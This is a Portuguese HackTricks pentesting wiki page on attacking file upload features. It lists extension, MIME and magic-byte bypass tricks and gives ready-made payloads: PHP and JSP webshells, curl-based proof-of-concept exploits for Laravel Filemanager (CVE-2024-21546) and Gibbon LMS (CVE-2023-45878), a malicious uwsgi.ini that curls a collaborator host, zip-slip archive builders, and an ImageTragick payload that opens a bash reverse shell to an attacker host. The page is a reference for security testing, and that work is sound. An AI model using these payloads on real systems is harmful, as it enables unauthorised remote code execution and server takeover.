# Upload de Arquivos

{{#include ../../banners/hacktricks-training.md}}

## Metodologia Geral de Upload de Arquivos

Outras extensões úteis:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Bypass checagens de extensões de arquivo

1. Se aplicável, verifique as extensões anteriores. Também teste usando algumas letras maiúsculas: _pHp, .pHP5, .PhAr ..._
2. _Verifique **adicionar uma extensão válida antes** da extensão de execução (use também as extensões anteriores):_
- _file.png.php_
- _file.png.Php5_
3. Tente adicionar **caracteres especiais no final.** Você pode usar o Burp para **bruteforce** todos os caracteres **ascii** e **Unicode**. (_Observação: você também pode tentar usar as **extensões** mencionadas **anteriormente**_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Tente contornar as proteções enganando o parser de extensões do lado servidor com técnicas como duplicar a extensão ou adicionar dados junk (bytes nulos) entre extensões. _Você também pode usar as **extensões anteriores** para preparar um payload melhor._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Adicione **outra camada de extensões** ao teste anterior:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Tente colocar a **extensão de execução antes da extensão válida** e torça para que o servidor esteja mal configurado. (útil para explorar misconfigurações do Apache onde qualquer coisa com extensão **_.php_**, mas não necessariamente terminando em .php, executará código):
- _ex: file.php.png_
7. Usando **NTFS alternate data stream (ADS)** no **Windows**. Neste caso, um caractere de dois pontos ":" será inserido após uma extensão proibida e antes de uma permitida. Como resultado, um **arquivo vazio com a extensão proibida** será criado no servidor (e.g. "file.asax:.jpg”). Este arquivo pode ser editado depois usando outras técnicas como usar seu short filename. O "**::$data**” pattern também pode ser usado para criar arquivos não vazios. Portanto, adicionar um ponto após esse pattern pode também ser útil para contornar restrições adicionais (.e.g. "file.asp::$data.”)
8. Tente ultrapassar os limites do nome do arquivo. A extensão válida é cortada e o PHP malicioso fica. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Alguns upload handlers cortam ou normalizam caracteres de ponto final do nome do arquivo salvo. No UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) em versões anteriores à 2.9.1, você pode contornar a validação de extensão ao:

- Usar um MIME de imagem válido e magic header (e.g., PNG’s `\x89PNG\r\n\x1a\n`).
- Nomear o arquivo enviado com uma extensão PHP seguida por um ponto, e.g., `shell.php.`.
- O servidor remove o ponto final e persiste `shell.php`, que será executado se for colocado em um diretório servido pela web (armazenamento público padrão como `/storage/files/`).

PoC mínimo (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Então acesse o caminho salvo (típico em Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
### Bypass Content-Type, Magic Number, Compression & Resizing

- Contorne as verificações de **Content-Type** definindo o **value** do **Content-Type** **header** para: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass **magic number** check adicionando no início do arquivo os **bytes de uma imagem real** (confunde o comando _file_). Ou introduza o shell dentro dos **metadados**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` ou você também pode **introduzir o payload diretamente** em uma imagem:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Se **compressions is being added to your image**, por exemplo usando bibliotecas PHP padrão como [PHP-GD](https://www.php.net/manual/fr/book.image.php), as técnicas anteriores podem não ser úteis. No entanto, você pode usar o **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) para inserir texto que **sobreviverá à compressão**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- A página web também pode estar **redimensionando** a **image**, usando por exemplo as funções do PHP-GD `imagecopyresized` ou `imagecopyresampled`. Contudo, você pode usar o **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) para inserir texto que **sobreviverá à compressão**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Outra técnica para criar um payload que **sobrevive a um redimensionamento de imagem**, usando a função PHP-GD `thumbnailImage`. Contudo, você pode usar o **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) para inserir texto que **sobreviverá à compressão**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- Encontre uma vulnerabilidade para **rename** o arquivo já enviado (para mudar a extensão).
- Encontre uma vulnerabilidade de **Local File Inclusion** para executar o backdoor.
- **Possible Information disclosure**:
1. Faça upload **várias vezes** (e ao **mesmo tempo**) do **mesmo arquivo** com o **mesmo nome**
2. Faça upload de um arquivo com o **nome** de um **arquivo** ou **folder** que **já existe**
3. Fazer upload de um arquivo com **"." , "..", or "…" como nome**. Por exemplo, no Apache em **Windows**, se a aplicação salva os arquivos enviados no diretório "/www/uploads/", o nome de arquivo "." criará um arquivo chamado
uploads” em "/www/".
4. Faça upload de um arquivo que pode não ser deletado facilmente, como **"…:.jpg"** em **NTFS**. (Windows)
5. Faça upload de um arquivo no **Windows** com **caracteres inválidos** como `|<>*?”` no nome. (Windows)
6. Faça upload de um arquivo no **Windows** usando **nomes reservados** (**proibidos**) como CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, e LPT9.
- Tente também **uploadar um executável** (.exe) ou um **.html** (menos suspeito) que **executará código** quando aberto acidentalmente pela vítima.

### Special extension tricks

Se você está tentando enviar arquivos para um **servidor PHP**, [veja o truque **.htaccess** para executar código](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Se você está tentando enviar arquivos para um **ASP server**, [veja o truque **.config** para executar código](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Os arquivos `.phar` são como os `.jar` para java, mas para php, e podem ser **usados como um arquivo php** (executando-os com php, ou incluindo-os dentro de um script...)

A extensão `.inc` às vezes é usada para arquivos php que são usados apenas para **importar arquivos**, então, em algum momento, alguém pode ter permitido **que essa extensão seja executada**.

## **Jetty RCE**

Se você conseguir enviar um arquivo XML para um servidor Jetty você pode obter [RCE porque **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Então, como mencionado na imagem a seguir, envie o arquivo XML para `$JETTY_BASE/webapps/` e espere pela shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Para uma exploração detalhada dessa vulnerabilidade, confira a pesquisa original: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Vulnerabilidades de Execução Remota de Comandos (Remote Command Execution, RCE) podem ser exploradas em servidores uWSGI se alguém tiver a capacidade de modificar o arquivo de configuração `.ini`. Os arquivos de configuração do uWSGI utilizam uma sintaxe específica para incorporar variáveis "mágicas", placeholders e operadores. Notavelmente, o operador '@', usado como `@(filename)`, é projetado para incluir o conteúdo de um arquivo. Entre os vários esquemas suportados no uWSGI, o esquema "exec" é particularmente potente, permitindo a leitura de dados a partir do standard output de um processo. Esse recurso pode ser manipulado para fins maliciosos, como Remote Command Execution ou Arbitrary File Write/Read, quando um arquivo de configuração `.ini` é processado.

Considere o seguinte exemplo de um arquivo `uwsgi.ini` malicioso, mostrando vários schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
A execução do payload ocorre durante a análise do arquivo de configuração. Para que a configuração seja ativada e processada, o processo uWSGI deve ser reiniciado (potencialmente após um crash ou devido a um Denial of Service) ou o arquivo deve estar configurado para auto-reload. O recurso auto-reload, se habilitado, recarrega o arquivo em intervalos especificados ao detectar alterações.

É crucial entender a natureza permissiva da análise do arquivo de configuração do uWSGI. Especificamente, o payload discutido pode ser inserido em um arquivo binário (como uma imagem ou PDF), ampliando ainda mais o escopo de exploração potencial.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Endpoint não autenticado no Gibbon LMS permite arbitrary file write dentro do web root, levando a pre-auth RCE ao dropar um arquivo PHP. Versões vulneráveis: até e incluindo 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Parâmetros necessários:
- `img`: data-URI-like string: `[mime];[name],[base64]` (o servidor ignora type/name, decodifica em base64 a parte final)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

PoC mínimo para escrever e ler de volta um arquivo:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Implante um webshell mínimo e execute comandos:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Notas:
- O handler realiza `base64_decode($_POST["img"])` após dividir por `;` e `,`, então escreve bytes em `$absolutePath . '/' . $_POST['path']` sem validar extensão/tipo.
- O código resultante é executado como o usuário do serviço web (por exemplo, XAMPP Apache no Windows).

Referências para este bug incluem o advisory do usd HeroLab e a entrada NVD. Veja a seção References abaixo.

## **wget Envio de Arquivo / Truque SSRF**

Em algumas ocasiões você pode descobrir que um servidor está usando **`wget`** para **baixar arquivos** e você pode **indicar** a **URL**. Nesses casos, o código pode estar verificando se a extensão dos arquivos baixados está dentro de uma whitelist para assegurar que somente arquivos permitidos serão baixados. Entretanto, **essa verificação pode ser contornada.**\
O **tamanho máximo** de um **nome de arquivo** em **linux** é **255**, entretanto, **wget** trunca os nomes de arquivo para **236** caracteres. Você pode **baixar um arquivo chamado "A"*232+".php"+".gif"**, esse nome de arquivo vai **contornar** a **verificação** (como neste exemplo **".gif"** é uma **extensão válida**), mas `wget` vai **renomear** o arquivo para **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Observe que **outra opção** que você pode estar pensando para contornar essa verificação é fazer o **servidor HTTP redirecionar para um arquivo diferente**, de modo que a URL inicial passe pela verificação, mas então o wget baixará o arquivo redirecionado com o novo nome. Isso **não funcionará** **a menos que** o wget esteja sendo usado com o **parâmetro** `--trust-server-names` porque **o wget baixará a página redirecionada com o nome do arquivo indicado na URL original**.

### Escapando do diretório de upload via NTFS junctions (Windows)

(Para este ataque você precisará de acesso local à máquina Windows) Quando uploads são armazenados sob subpastas por usuário no Windows (ex.: C:\Windows\Tasks\Uploads\<id>\) e você controla a criação/deleção dessa subpasta, você pode substituí-la por uma directory junction apontando para um local sensível (ex.: o webroot). Uploads subsequentes serão gravados no caminho de destino, permitindo execução de código se o destino interpretar server‑side code.

Fluxo de exemplo para redirecionar uploads para o webroot do XAMPP:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Notas
- mklink /J cria uma junção de diretório NTFS (reparse point). A conta do servidor web deve seguir a junção e ter permissão de escrita no destino.
- Isso redireciona gravações arbitrárias de arquivos; se o destino executar scripts (PHP/ASP), isso se torna RCE.
- Defesas: não permita que raízes de upload graváveis sejam controladas pelo atacante sob C:\Windows\Tasks ou similar; bloqueie a criação de junções; valide extensões no lado do servidor; armazene uploads em um volume separado ou com deny‑execute ACLs.

### GZIP-compressed body upload + path traversal in destination param → JSP webshell RCE (Tomcat)

Some upload/ingest handlers write the raw request body to a filesystem path that is constructed from user-controlled query parameters. If the handler also supports Content-Encoding: gzip and fails to canonicalize/validate the destination path, you can combine directory traversal with a gzipped payload to write arbitrary bytes into a web-served directory and obtain RCE (e.g., drop a JSP under Tomcat’s webapps).

Fluxo genérico de exploração:
- Prepare seu payload do lado do servidor (por exemplo, um JSP webshell mínimo) e compacte os bytes com gzip.
- Envie um POST onde um parâmetro de path (por exemplo, token) contém directory traversal escapando da pasta pretendida, e file indica o nome do arquivo a persistir. Defina Content-Type: application/octet-stream e Content-Encoding: gzip; o body é o payload comprimido.
- Acesse o arquivo escrito para acionar a execução.

Illustrative request:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
Em seguida, acione:
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
Notas
- Os caminhos de destino variam conforme a instalação (por exemplo, /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ em algumas stacks). Qualquer pasta exposta na web que execute JSP funcionará.
- Burp Suite’s Hackvertor extension pode produzir um corpo gzip correto a partir do seu payload.
- Este é um padrão puro pre-auth arbitrary file write → RCE; não depende de multipart parsing.

Mitigações
- Determine os destinos de upload server-side; nunca confie em fragmentos de caminho vindos dos clientes.
- Canonicalize e imponha que o caminho resolvido permaneça dentro de um diretório base allow-listed.
- Armazene uploads em um volume não executável e negue a execução de scripts a partir de caminhos graváveis.

## Ferramentas

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) is a powerful tool designed to assist Pentesters and Bug Hunters in testing file upload mechanisms. It leverages various bug bounty techniques to simplify the process of identifying and exploiting vulnerabilities, ensuring thorough assessments of web applications.

### Corrupting upload indices with snprintf quirks (historical)

Alguns handlers de upload legados que usam `snprintf()` ou similar para construir arrays multi-file a partir de um upload de arquivo único podem ser enganados a forjar a estrutura `_FILES`. Devido a inconsistências e truncamento no comportamento de `snprintf()`, um upload único cuidadosamente criado pode aparecer como múltiplos arquivos indexados no lado do servidor, confundindo lógica que assume uma forma estrita (por exemplo, tratando-o como um upload multi-file e seguindo ramos inseguros). Embora seja nicho hoje, esse padrão de “index corruption” ocasionalmente ressurgem em CTFs e bases de código mais antigas.

## De upload de arquivos para outras vulnerabilidades

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/] and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Envie o \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) conteúdo para verificar se o servidor possui algum **antivirus**
- Verifique se existe algum **limite de tamanho** ao enviar arquivos

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Consulte [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) para outros tipos de arquivo.

## Zip/Tar File Automatically decompressed Upload

Se você puder enviar um ZIP que será descomprimido no servidor, você pode fazer 2 coisas:

### Symlink

Faça upload de um arquivo contendo links simbólicos para outros arquivos; então, ao acessar os arquivos descomprimidos você acessará os arquivos linkados:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Descomprimir em pastas diferentes

A criação inesperada de arquivos em diretórios durante a descompressão é um problema significativo. Apesar da suposição inicial de que essa configuração poderia proteger contra OS-level command execution via uploads de arquivos maliciosos, o suporte a compressão hierárquica e as capacidades de directory traversal do formato de arquivo ZIP podem ser explorados. Isso permite que atacantes contornem restrições e escapem de diretórios de upload seguros manipulando a funcionalidade de descompressão da aplicação alvo.

Um exploit automatizado para criar tais arquivos está disponível em [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). A utilidade pode ser usada como mostrado:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Além disso, a **symlink trick with evilarc** é uma opção. Se o objetivo for atingir um arquivo como `/flag.txt`, um symlink para esse arquivo deve ser criado no seu sistema. Isso garante que evilarc não encontre erros durante sua operação.

A seguir há um exemplo de código Python usado para criar um arquivo zip malicioso:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusing compression for file spraying**

Para mais detalhes **check the original post in**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: Código PHP é escrito para executar comandos passados através da variável `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Vários arquivos são criados e um arquivo zip é montado contendo esses arquivos.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Os nomes dos arquivos dentro do zip são alterados usando vi ou um editor hex, mudando "xxA" para "../" para atravessar diretórios.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

### ZIP NUL-byte filename smuggling (PHP ZipArchive confusion)

Quando um backend valida entradas ZIP usando o ZipArchive do PHP, mas a extração grava no sistema de arquivos usando os nomes raw, é possível contrabandear uma extensão não permitida inserindo um NUL (0x00) nos campos de nome de arquivo. O ZipArchive trata o nome da entrada como uma C‑string e trunca no primeiro NUL; o sistema de arquivos grava o nome completo, descartando tudo após o NUL.

Fluxo em alto nível:
- Prepare um arquivo contêiner legítimo (por exemplo, um PDF válido) que embuta um pequeno stub PHP em um stream para que o magic/MIME permaneça PDF.
- Nomeie-o como `shell.php..pdf`, zip it, then hex‑edit the ZIP local header and central directory filename to replace the first `.` after `.php` with `0x00`, resulting in `shell.php\x00.pdf`.
- Validadores que dependem do ZipArchive irão “ver” `shell.php .pdf` e permitir; o extrator grava `shell.php` no disco, levando a RCE se a pasta de upload for executável.

Minimal PoC steps:
```bash
# 1) Build a polyglot PDF containing a tiny webshell (still a valid PDF)
printf '%s' "%PDF-1.3\n1 0 obj<<>>stream\n<?php system($_REQUEST["cmd"]); ?>\nendstream\nendobj\n%%EOF" > embedded.pdf

# 2) Trick name and zip
cp embedded.pdf shell.php..pdf
zip null.zip shell.php..pdf

# 3) Hex-edit both the local header and central directory filename fields
#    Replace the dot right after ".php" with 00 (NUL) => shell.php\x00.pdf
#    Tools: hexcurse, bless, bvi, wxHexEditor, etc.

# 4) Local validation behavior
php -r '$z=new ZipArchive; $z->open("null.zip"); echo $z->getNameIndex(0),"\n";'
# -> shows truncated at NUL (looks like ".pdf" suffix)
```
Notas
- Altere AMBAS as ocorrências do nome de arquivo (local e no diretório central). Algumas ferramentas também adicionam uma entrada data descriptor extra — ajuste todos os campos de nome se presentes.
- O arquivo payload ainda deve passar na detecção magic/MIME do lado do servidor. Embutir o PHP em um stream de PDF mantém o cabeçalho válido.
- Funciona quando o caminho de enumeração/validação e o caminho de extração/gravação discordam no tratamento de strings.

### ZIPs empilhados/concatenados (discordância do parser)

Concatenar dois arquivos ZIP válidos produz um blob onde diferentes parsers se concentram em diferentes registros EOCD. Muitas ferramentas localizam o último End Of Central Directory (EOCD), enquanto algumas bibliotecas (por exemplo, ZipArchive em fluxos de trabalho específicos) podem analisar o primeiro arquivo que encontram. Se a validação enumerar o primeiro arquivo e a extração usar outra ferramenta que respeite o último EOCD, um arquivo benigno pode passar nas verificações enquanto um malicioso é extraído.

PoC:
```bash
# Build two separate archives
printf test > t1; printf test2 > t2
zip zip1.zip t1; zip zip2.zip t2

# Stack them
cat zip1.zip zip2.zip > combo.zip

# Different views
unzip -l combo.zip   # warns about extra bytes; often lists entries from the last archive
php -r '$z=new ZipArchive; $z->open("combo.zip"); for($i=0;$i<$z->numFiles;$i++) echo $z->getNameIndex($i),"\n";'
```
Padrão de abuso
- Crie um arquivo benigno (tipo permitido, por exemplo, um PDF) e um segundo arquivo contendo uma extensão bloqueada (por exemplo, `shell.php`).
- Concatene-os: `cat benign.zip evil.zip > combined.zip`.
- Se o servidor valida com um parser (vê benign.zip) mas extrai com outro (processa evil.zip), o arquivo bloqueado acaba no caminho de extração.

## ImageTragic

Envie este conteúdo com uma extensão de imagem para explorar a vulnerabilidade **(ImageMagick , 7.0.1-1)** (a partir do [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Incorporando PHP Shell em PNG

